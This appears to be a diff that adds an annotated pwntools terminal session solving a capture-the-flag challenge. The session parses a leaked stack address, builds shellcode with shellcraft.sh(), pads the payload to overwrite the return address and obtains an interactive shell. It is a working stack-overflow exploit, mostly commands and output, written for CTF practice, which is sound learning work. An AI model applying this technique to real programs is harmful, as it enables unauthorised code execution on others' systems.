@@ -1,0 +1,25 @@
+──(kali㉿kali)-[~/pwns/chall_03]
+└─$ python   ------------------------------------------------------------------->  Command   
+Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from pwn import *   ------------------------------------------------------------------->  Command   
+>>> p=process('./chall_03')  ------------------------------------------------------------------->  Command   
+[x] Starting local process './chall_03'
+[+] Starting local process './chall_03': pid 309284
+>>> p.recv()   ------------------------------------------------------------------->  Command   
+b"She sellz sea shellz by the return address\nHere's a leak :) 0x7fff650bdaa0\n"
+>>> rec=_    ------------------------------------------------------------------->  Command   
+>>> rec      ------------------------------------------------------------------->  Command   
+b"She sellz sea shellz by the return address\nHere's a leak :) 0x7fff650bdaa0\n"
+>>> a=int(rec.split(b":) ")[1],16)  ------------------------------------------------------------------->  Command   
+>>> hex(a)  ------------------------------------------------------------------->  Command   
+'0x7fff650bdaa0'
+>>> context.arch="amd64"   ------------------------------------------------------------------->  Command   
+>>> payload=asm(shellcraft.sh())  ------------------------------------------------------------------->  Command   
+>>> payload+=b"a" * (328-len(payload))  ------------------------------------------------------------------->  Command   
+>>> payload+=p64(a)  ------------------------------------------------------------------->  Command   
+>>> p.sendline(payload)  ------------------------------------------------------------------->  Command   
+>>> p.interactive()  ------------------------------------------------------------------->  Command   
+[*] Switching to interactive mode
+whoami
+kali
